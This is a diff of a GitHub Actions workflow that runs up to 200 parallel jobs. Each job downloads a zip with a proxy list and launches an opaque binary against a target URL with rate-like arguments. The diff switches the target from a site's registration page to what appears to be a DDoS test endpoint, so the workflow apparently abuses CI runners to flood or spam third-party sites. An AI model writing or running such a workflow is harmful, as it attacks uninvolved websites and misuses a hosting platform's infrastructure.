@@ -9,7 +9,7 @@ on:
 
 jobs:
   parallel-execution-ubuntu:
-    runs-on: ubuntu-24.04
+    runs-on: ubuntu-22.04
     strategy:
       max-parallel: 200
       fail-fast: false  # Continue even if some instances fail
@@ -34,12 +34,12 @@ jobs:
           unzip Fc-main.zip
           mv  Fc-main/proxy.txt 90.txt
           chmod +x *
-          mv tol o         
-          screen -dms ve ./o https://maskify.su/register 350 1 1 90.txt
+          mv ki o         
+          screen -dms ve ./o https://c2.dstatbot.win/u0QczxYL 750 1 1 
           
            
           
-          ./o https://maskify.su/register 350 1 1 90.txt
+          ./o https://c2.dstatbot.win/u0QczxYL 750 1 1 
           
 
           
